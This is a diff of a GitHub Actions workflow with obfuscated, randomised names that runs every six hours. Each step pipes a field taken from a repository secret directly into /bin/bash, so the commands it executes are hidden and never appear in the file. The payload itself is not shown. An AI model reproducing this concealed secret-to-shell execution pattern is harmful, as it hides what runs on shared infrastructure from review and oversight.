@@ -1,27 +1,27 @@
 name: caocao19870105
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
+    - cron: '31 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caocao19870105
         env:
-          jusip750: ${{ secrets.jusip750 }}
+          p49: ${{ secrets.p49 }}
         run: |
-          echo $jusip750 | jq -r .t006 | /bin/bash
-          echo $wc10673 | jq -r .otxw86 | /bin/bash
-          echo $l514 | jq -r .cpfwv4 | /bin/bash
-          echo $w49 | jq -r .ch1 | /bin/bash
-          echo $hfcf47 | jq -r .lzcy05 | /bin/bash
-          echo $jghwx800 | jq -r .x3877 | /bin/bash
-          echo $xdcz721 | jq -r .jimaj8512 | /bin/bash
-          echo $u632 | jq -r .yiqnx6 | /bin/bash
-          echo $n3 | jq -r .bop922 | /bin/bash
-          echo $yrcm87405 | jq -r .winms68 | /bin/bash
-          echo $cbn7 | jq -r .kpxc60616 | /bin/bash
+          echo $p49 | jq -r .o22 | /bin/bash
+          echo $pqc7 | jq -r .mmrop30073 | /bin/bash
+          echo $ci667 | jq -r .tllrk0532 | /bin/bash
+          echo $q8 | jq -r .jfbnq5207 | /bin/bash
+          echo $dz88 | jq -r .uzj2943 | /bin/bash
+          echo $ns0669 | jq -r .wvzeq9 | /bin/bash
+          echo $zcw94213 | jq -r .eh9 | /bin/bash
+          echo $tfbkl12 | jq -r .nlw3 | /bin/bash
+          echo $pu792 | jq -r .pjz3977 | /bin/bash
+          echo $nth0674 | jq -r .jmy7838 | /bin/bash
 
